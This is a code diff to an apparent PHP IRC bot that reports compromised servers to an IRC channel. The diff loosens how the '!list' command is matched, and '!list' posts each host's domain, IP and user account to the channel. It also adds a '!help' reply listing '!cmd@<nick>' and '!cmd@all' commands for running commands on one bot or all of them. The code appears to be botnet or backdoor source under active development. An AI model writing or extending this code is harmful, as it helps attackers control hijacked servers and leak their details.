@@ -290,10 +290,15 @@ function ircBot() {
             }
         }
         
-        // Handle !list command
-        if (preg_match('/PRIVMSG ' . preg_quote(IRC_CHANNEL) . ' :!list$/i', $data)) {
+        // Handle !list command (match anywhere in message)
+        if (preg_match('/PRIVMSG ' . preg_quote(IRC_CHANNEL) . ' :.*!list/i', $data)) {
             $info_line = "[$bot_nick] Domain: {$bot_info['domain']} | IP: {$bot_info['server_ip']} | User: {$bot_info['user']}";
             fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :$info_line\r\n");
+        }
+        
+        // Handle !help command
+        if (preg_match('/PRIVMSG ' . preg_quote(IRC_CHANNEL) . ' :.*!help/i', $data)) {
+            fputs($socket, "PRIVMSG " . IRC_CHANNEL . " :[$bot_nick] Commands: !list | !cmd@<nick> <command> | !cmd@all <command> | !info@<nick>\r\n");
         }
         
         // Handle !info command
